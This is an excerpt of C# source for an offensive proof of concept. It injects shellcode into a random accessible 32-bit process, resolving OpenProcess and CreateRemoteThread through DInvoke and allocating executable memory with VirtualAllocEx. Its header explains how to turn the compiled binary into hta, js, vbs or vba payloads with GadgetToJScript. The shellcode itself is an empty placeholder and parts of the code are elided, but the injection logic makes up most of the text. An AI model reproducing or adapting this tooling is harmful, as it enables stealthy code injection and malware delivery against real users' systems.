...
namespace InjectGadgetToJScript
{
    /* 
     * Shellcode inject POC for GadgetToJScript using DInvoke
     * Finds an random 32 bit accessible target to inject into
     * 
     * Usage:
     * 1. Compile into a 32 bit binary
     * 2. Convert into  js, vbs, vba or hta using GadgetToJScript
     * 
     * eg:
     * .\GadgetToJScript.exe -w hta -o inject -a InjectGadgetToJScript.exe -r -b 
     * 
     * ~Flangvik
     * MAJOR credits to @FuzzySec and @TheRealWover for the DInvoke project
     */

    public class Program
    {
        //This is KISS , love it
        //https://stackoverflow.com/questions/28461429/c-sharp-check-if-program-is-running-for-current-user#comment45252159_28463165
        ...
        static void Main(string[] args)
        {
            ...
            byte[] shellcode_msgbox_32bit = Convert.FromBase64String(@"");
            ...
            foreach (var process in Process.GetProcesses())
            {
                try
                {
                    //Since 32-bit procs cannot access modules++ for an 64 bit proc, this  will "fail" / skip all 64 bit procs
                    //We also wanna make sure our user can access the process
                    if (!process.Modules[0].FileName.StartsWith(@"ThisIsHack") && ProcessAccessibleForCurrentUser(process))
                    {

                        var shellcode = shellcode_msgbox_32bit;
                        IntPtr pointer = TinySharpSploit.GetLibraryAddress("kernel32.dll", "OpenProcess");
                        ...
                        IntPtr alloc = virtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40);
                        ...
                        pointer = TinySharpSploit.GetLibraryAddress("kernel32.dll", "CreateRemoteThread");
